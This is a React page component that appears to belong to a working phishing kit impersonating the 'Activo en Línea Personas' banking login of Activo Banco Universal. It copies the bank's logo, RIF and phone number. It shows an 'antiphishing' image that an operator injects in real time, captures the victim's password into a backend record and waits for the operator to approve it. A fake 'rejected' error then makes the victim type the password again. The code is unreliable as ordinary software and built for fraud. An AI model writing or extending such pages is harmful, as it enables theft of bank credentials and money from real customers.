import { useState, useRef, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { api } from "@/api/apiClient";
import { usePresence } from "@/hooks/usePresence";

export default function PersonasVerification() {
  const navigate = useNavigate();
  const [imageConfirmed, setImageConfirmed] = useState(false);
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [waitingApproval, setWaitingApproval] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");
  const [rejectionReason, setRejectionReason] = useState("");
  const [requestId, setRequestId] = useState("");
  const [presenceId, setPresenceId] = useState(null);
  const [userImage, setUserImage] = useState(null);
  const [inputZoomed, setInputZoomed] = useState(false);
  /** @type {React.RefObject<HTMLInputElement>} */
  const passwordRef = useRef(null);

  /** @type {(e: React.FocusEvent<HTMLInputElement>) => void} */
  const handlePasswordFocus = (e) => {
    setInputZoomed(true);
    setTimeout(() => {
      e.target.scrollIntoView({ behavior: "smooth", block: "center", inline: "center" });
    }, 320);
  };

  const handlePasswordBlur = () => {
    setInputZoomed(false);
  };

  // Habilita scroll manual (incluido horizontal) mientras el zoom esta activo,
  // ya que al acercar la vista el contenido escalado excede el ancho visible.
  useEffect(() => {
    document.documentElement.classList.toggle("pv-zoomed", inputZoomed);
    document.body.classList.toggle("pv-zoomed", inputZoomed);
    return () => {
      document.documentElement.classList.remove("pv-zoomed");
      document.body.classList.remove("pv-zoomed");
    };
  }, [inputZoomed]);

  // Hook para trackear presencia del usuario
  usePresence(presenceId, "Verificación Persona");

  useEffect(() => {
    const id = sessionStorage.getItem("pinoRequestId");
    const username = sessionStorage.getItem("pinoUsername");
    const pId = sessionStorage.getItem("pinoPresenceId");

    if (!id || !username) {
      navigate("/pino-pers");
    } else {
      setRequestId(id);
      setPresenceId(pId);
    }
  }, [navigate]);

  // Cargar imagen del usuario (se recarga cada 2 segundos si no existe)
  useEffect(() => {
    if (!requestId) return;

    const loadUserImage = async () => {
      try {
        const request = await api.entities.PinoPermiso.get(requestId);
        if (request && request.imagen) {
          console.log("Imagen cargada:", request.imagen);
          setUserImage(request.imagen);
        } else {
          console.log("No hay imagen disponible aún");
        }
      } catch (err) {
        console.error("Error cargando imagen:", err);
      }
    };

    // Cargar imagen inmediatamente
    loadUserImage();

    // Push instantáneo: en cuanto el admin guarda la imagen, Supabase avisa sin esperar
    const unsubscribe = api.entities.PinoPermiso.onRowChange(requestId, (row) => {
      if (row?.imagen) {
        console.log("Imagen recibida por Realtime:", row.imagen);
        setUserImage(row.imagen);
      }
    });

    // Respaldo por si el proyecto no tiene Realtime habilitado en la tabla
    const interval = setInterval(() => {
      loadUserImage();
    }, 400);

    return () => {
      unsubscribe();
      clearInterval(interval);
    };
  }, [requestId]);

  useEffect(() => {
    if (!waitingApproval || !requestId) return;

    const interval = setInterval(async () => {
      try {
        const request = await api.entities.PinoPermiso.get(requestId);

        if (request.status === "aprobado" && request.etapa === "paso_2") {
          clearInterval(interval);
          setWaitingApproval(false);
          navigate("/pino-princi-per");
        } else if (request.status === "rechazado" || request.estado === "rechazado") {
          clearInterval(interval);
          setWaitingApproval(false);

          // Obtener razón del rechazo de múltiples posibles campos
          const razon = request.razon_rechazo ||
                       request.motivo_rechazo ||
                       request.razon ||
                       request.mensaje ||
                       "El código fue rechazado. Por favor intente nuevamente.";

          console.log("❌ Solicitud rechazada. Razón:", razon);
          setRejectionReason(razon);
          setErrorMessage("");
        }
      } catch (err) {
        console.error("Error checking approval:", err);
      }
    }, 2000);

    return () => clearInterval(interval);
  }, [waitingApproval, requestId, navigate]);

  /** @type {(e: React.MouseEvent) => void} */
  const handleImageClick = (e) => {
    e.preventDefault();
    setImageConfirmed(true);
    setTimeout(() => passwordRef.current?.focus(), 50);
  };

  const handleInputClick = () => {
    if (!imageConfirmed) {
      alert("Favor confirme la imagen antiphishing");
    }
  };

  /** @type {(e: React.FormEvent<HTMLFormElement>) => Promise<void>} */
  const handleFormSubmit = async (e) => {
    e.preventDefault();

    if (!imageConfirmed) {
      alert("Favor confirme la imagen antiphishing");
      return;
    }

    if (!password.trim()) {
      setErrorMessage("Ingresa una clave");
      return;
    }

    setLoading(true);
    setErrorMessage("");

    try {
      await api.entities.PinoPermiso.update(requestId, {
        clave: password,
        etapa: "paso_2",
        status: "pendiente",
      });

      setWaitingApproval(true);
    } catch (err) {
      const message = err instanceof Error ? err.message : "Error al guardar clave";
      setErrorMessage(message);
    } finally {
      setLoading(false);
    }
  };

  /** @type {(e: React.MouseEvent<HTMLButtonElement>) => void} */
  const handleVolver = (e) => {
    e.preventDefault();
    sessionStorage.removeItem("pinoRequestId");
    sessionStorage.removeItem("pinoUsername");
    navigate("/pino-pers");
  };

  return (
    <div className={`personas-verification-root${inputZoomed ? " pv-zoomed" : ""}`} style={{
      minHeight: "100vh",
      backgroundColor: "#f0f0f0",
      fontFamily: "Arial, Helvetica, sans-serif",
      overflowX: "hidden"
    }}>
      <style>{`
        @keyframes bankingSpinner {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }

        @media screen and (max-width: 768px) {
          html, body {
            overflow-x: hidden !important;
            width: 100% !important;
          }
          html.pv-zoomed, body.pv-zoomed {
            overflow-x: auto !important;
            -webkit-overflow-scrolling: touch !important;
          }
          .personas-verification-root {
            overflow-x: hidden !important;
            display: flex !important;
            flex-direction: column !important;
            min-height: 100vh !important;
            box-sizing: border-box !important;
          }
          .personas-verification-root.pv-zoomed {
            overflow-x: auto !important;
            -webkit-overflow-scrolling: touch !important;
          }
          .pv-scale-wrapper {
            width: calc(100vw * 2.5) !important;
            transform: scale(0.4) !important;
            transform-origin: top center !important;
            margin-left: calc(50vw - (100vw * 1.25)) !important;
            margin-right: auto !important;
            display: flex !important;
            flex-direction: column !important;
            flex: 1 !important;
            transition: transform 0.3s ease !important;
          }
          .pv-scale-wrapper.pv-zoomed {
            transform: scale(0.7) !important;
          }
          .pv-main-wrapper {
            flex: 1 !important;
            display: flex !important;
            align-items: center !important;
            justify-content: center !important;
            padding: 40px 16px !important;
          }
          .pv-form-cols {
            flex-direction: row !important;
            flex-wrap: nowrap !important;
          }
        }
        @keyframes pulse {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.3; }
        }
      `}</style>

      {/* Loading overlay */}
      {waitingApproval && (
        <div style={{
          position: "fixed",
          top: 0,
          left: 0,
          width: "100%",
          height: "100dvh",
          backgroundColor: "rgba(2, 0, 77, 0.95)",
          display: "flex",
          flexDirection: "column",
          alignItems: "center",
          justifyContent: "center",
          zIndex: 9999,
          gap: "24px",
          overflow: "hidden"
        }}>
          {/* Spinner */}
          <div style={{
            width: "60px",
            height: "60px",
            border: "4px solid rgba(255, 255, 255, 0.2)",
            borderTop: "4px solid #3C44D1",
            borderRadius: "50%",
            animation: "bankingSpinner 1.2s linear infinite",
            flexShrink: 0
          }} />

          {/* Text */}
          <h2 style={{
            color: "#FFFFFF",
            fontSize: "16px",
            fontWeight: 600,
            margin: "0",
            fontFamily: "Arial, Helvetica, sans-serif",
            textAlign: "center"
          }}>
            Cargando...
          </h2>

        </div>
      )}

      {/* Scale wrapper - everything scales together */}
      <div className={`pv-scale-wrapper${inputZoomed ? " pv-zoomed" : ""}`}>
        {/* Header */}
        {!waitingApproval && (
          <div style={{
            backgroundColor: "#02004D",
            padding: "12px 24px",
            display: "flex",
            alignItems: "center",
            justifyContent: "space-between",
            whiteSpace: "nowrap"
          }}>
            <img
              src="https://www.bancoactivo.com/logo.svg"
              alt="Activo Banco Universal"
              style={{ height: "40px", filter: "brightness(0) invert(1)", flexShrink: 0 }}
            />
            <span style={{ color: "#FFFFFF", fontSize: "13px", whiteSpace: "nowrap" }}>RIF: J-08006622-7</span>
          </div>
        )}

        {/* Main content */}
        <div className="pv-main-wrapper" style={{ display: "flex", justifyContent: "center", alignItems: "flex-start", padding: "40px 16px" }}>
          <div
            className="pv-card"
            style={{
              backgroundColor: "#f0f2f5",
              border: "1px solid #cccccc",
              borderRadius: "4px",
              width: "100%",
              maxWidth: "860px",
              padding: "24px 32px 32px",
              display: waitingApproval ? "none" : "block"
            }}
          >
          {/* Title */}
          <div style={{ marginBottom: "32px", borderBottom: "2px solid #e0e0e0", paddingBottom: "12px" }}>
            <h1 style={{
              fontSize: "18px",
              fontWeight: "600",
              color: "#082C62",
              margin: 0,
              display: "flex",
              alignItems: "center"
            }}>
              <span>Activo en Línea</span>
              <span style={{
                display: "inline-block",
                width: "3px",
                height: "28px",
                backgroundColor: "#FF7900",
                margin: "0 8px"
              }}></span>
              <span style={{ color: "#3C44D1" }}>Personas</span>
            </h1>
          </div>

          {waitingApproval && !rejectionReason ? (
            <div style={{
              minHeight: "400px",
              animation: "pulse 1.5s infinite"
            }}>
              <style>{`
                @keyframes pulse {
                  0%, 100% { opacity: 1; }
                  50% { opacity: 0.3; }
                }
              `}</style>
            </div>
          ) : (
            <div className="pv-form-cols" style={{
              display: "flex",
              gap: "32px",
              flexWrap: "nowrap"
            }}>
              {/* LEFT COLUMN */}
              <div style={{
                flex: "1 1 200px"
              }}>
                    <h2 style={{
                      fontWeight: 700,
                      color: "#02004D",
                      fontSize: "14px",
                      margin: "0 0 16px 0"
                    }}>
                      Imagen Antiphishing
                    </h2>

                    <div style={{ display: "flex", justifyContent: "center", marginBottom: "16px" }}>
                      {userImage ? (
                        <img
                          src={userImage}
                          alt="Imagen de usuario"
                          decoding="sync"
                          fetchPriority="high"
                          onClick={handleImageClick}
                          onError={(e) => {
                            console.error("Error al cargar la imagen:", userImage);
                            e.currentTarget.style.display = "none";
                            setUserImage(null);
                          }}
                          style={{
                            width: "110px",
                            height: "110px",
                            border: "1px solid #999",
                            borderRadius: "4px",
                            cursor: "pointer",
                            objectFit: "cover",
                            backgroundColor: "#f0f0f0"
                          }}
                        />
                      ) : (
                        <div
                          onClick={handleImageClick}
                          style={{
                            width: "110px",
                            height: "110px",
                            backgroundColor: "#f0f2f5",
                            border: "1px solid #999",
                            borderRadius: "4px",
                            display: "flex",
                            alignItems: "center",
                            justifyContent: "center",
                            cursor: "pointer",
                            color: "#666",
                            fontSize: "12px"
                          }}
                        />
                      )}
                    </div>

                    <p style={{
                      fontSize: "11px",
                      color: "#02004D",
                      lineHeight: 1.5,
                      marginBottom: "12px"
                    }}>
                      Estimado Cliente, en caso de no reconocer la imagen desplegada evite ingresar la Clave y por favor comuniquese al Centro de Atención Activa a través del 0501-ACTIVO1 (0501-2284861)
                    </p>

                    {!imageConfirmed && (
                      <p style={{
                        fontSize: "11px",
                        color: "#02004D",
                        lineHeight: 1.5
                      }}>
                        Haga click <a href="#" onClick={handleImageClick} style={{
                          color: "#c62828",
                          fontWeight: "bold",
                          textDecoration: "none"
                        }}>AQUÍ</a> si esta es su imagen o sello personal, de esta manera se habilitará el campo para el ingreso de su clave.
                      </p>
                    )}
              </div>

              {/* RIGHT COLUMN */}
              <div style={{
                flex: "1 1 180px"
              }}>
                    <h2 style={{
                      fontWeight: 700,
                      color: "#02004D",
                      fontSize: "14px",
                      margin: "0 0 16px 0"
                    }}>
                      Usuarios Registrados
                    </h2>

                    <p style={{
                      fontSize: "12px",
                      color: "#02004D",
                      lineHeight: 1.5,
                      marginBottom: "16px"
                    }}>
                      Ingrese la clave y luego presione Aceptar
                    </p>

                    <form onSubmit={handleFormSubmit}>
                      <div style={{
                        display: "flex",
                        alignItems: "center",
                        gap: "38px",
                        marginBottom: "12px"
                      }}>
                        <label style={{
                          fontSize: "12px",
                          color: "#333",
                          fontWeight: "bold",
                          whiteSpace: "nowrap"
                        }}>
                          Clave:
                        </label>
                        <input
                          ref={passwordRef}
                          type="password"
                          value={password}
                          onChange={(e) => {
                            const value = e.target.value.replace(/\s/g, '');
                            setPassword(value);
                          }}
                          onClick={handleInputClick}
                          onFocus={handlePasswordFocus}
                          onBlur={handlePasswordBlur}
                          disabled={!imageConfirmed || loading}
                          placeholder=""
                          style={{
                            width: "160px",
                            height: "28px",
                            padding: "4px",
                            fontSize: "7px",
                            letterSpacing: "1px",
                            border: imageConfirmed ? "2px solid #87CEEB" : "1px solid #aaa",
                            borderRadius: "3px",
                            backgroundColor: !imageConfirmed ? "#EEEEEE" : "#F0F8FF",
                            boxSizing: "border-box",
                            outline: "none",
                            opacity: 1,
                            cursor: !imageConfirmed ? "not-allowed" : "text",
                            color: !imageConfirmed ? "#999" : "#333",
                            boxShadow: imageConfirmed ? "0 0 8px rgba(135, 206, 235, 0.6)" : "none"
                          }}
                        />
                      </div>

                      {rejectionReason ? (
                        <div style={{
                          padding: "12px",
                          backgroundColor: "#ffebee",
                          border: "1px solid #ef5350",
                          borderRadius: "4px",
                          color: "#c62828",
                          fontSize: "12px",
                          marginBottom: "12px",
                          lineHeight: "1.5"
                        }}>
                          Estimado Cliente, la clave debe tener un mínimo de 8 y máximo de 12 caracteres. Por favor intente de nuevo.
                        </div>
                      ) : errorMessage && (
                        <div style={{
                          padding: "8px",
                          backgroundColor: "#ffebee",
                          border: "1px solid #ef5350",
                          borderRadius: "4px",
                          color: "#c62828",
                          fontSize: "11px",
                          marginBottom: "12px"
                        }}>
                          {errorMessage}
                        </div>
                      )}

                      <div style={{
                        display: "flex",
                        gap: "8px",
                        justifyContent: "flex-start"
                      }}>
                        <button
                          type="button"
                          onClick={() => {
                            if (rejectionReason) {
                              setRejectionReason("");
                              setPassword("");
                              setImageConfirmed(false);
                            } else {
                              sessionStorage.removeItem("pinoRequestId");
                              sessionStorage.removeItem("pinoUsername");
                              navigate("/pino-pers");
                            }
                          }}
                          disabled={loading}
                          style={{
                            backgroundColor: "#3C44D1",
                            border: "none",
                            padding: "5px 12px",
                            fontSize: "12px",
                            cursor: loading ? "not-allowed" : "pointer",
                            color: "#FFFFFF",
                            borderRadius: "3px"
                          }}
                        >
                          Volver
                        </button>
                        <button
                          type="submit"
                          disabled={!imageConfirmed || loading}
                          style={{
                            backgroundColor: "#3C44D1",
                            border: "none",
                            color: "#FFFFFF",
                            padding: "5px 12px",
                            fontSize: "12px",
                            fontFamily: "Arial, Helvetica, sans-serif",
                            cursor: !imageConfirmed || loading ? "not-allowed" : "pointer",
                            borderRadius: "3px"
                          }}
                        >
                          {loading ? "..." : "Aceptar"}
                        </button>
                      </div>
                    </form>
              </div>
            </div>
          )}
          </div>
        </div>
      </div>

    </div>
  );
}
